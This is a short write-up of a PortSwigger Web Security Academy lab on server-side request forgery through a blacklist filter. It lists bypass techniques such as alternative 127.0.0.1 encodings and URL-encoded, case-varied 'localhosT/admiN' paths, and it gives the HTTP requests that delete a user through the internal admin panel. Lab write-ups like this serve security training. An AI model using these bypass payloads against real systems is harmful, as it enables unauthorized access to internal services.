# [Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

## Lab

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Scan

- Burpsuite scanner: detected `Out-of-band resource load (HTTP)`
  - body: `stockApi=http://knbwyjlwtx7jmf2crvupaw6roiuci26vunhd52.oastify.com/product/stock/check?productId=2&storeId=1`

## Analysis

ssrf blocked:

```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/Admin

HTTP/1.1 400 Bad Request

"External stock check blocked for security reasons"
```

The blacklist method has an inherited weakness: incomplete blacklist vulnerability.

Bypass:

- Using an alternative IP representation of `127.0.0.1`: such as `2130706433`, `017700000001`, or `127.1`.
- Registering your own domain name that resolves to 127.0.0.1. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscating blocked strings using URL encoding or case variation.

## Exploit

bypass blacklist:

```http
POST /product/stock HTTP/1.1
Host: id.web-security-academy.net
...

stockApi=http%3a//localhosT/admiN
```

Solved:

```http
POST /product/stock HTTP/1.1
Host: id.web-security-academy.net

stockApi=http%3a//localhosT/admiN/delete?username=carlos
```
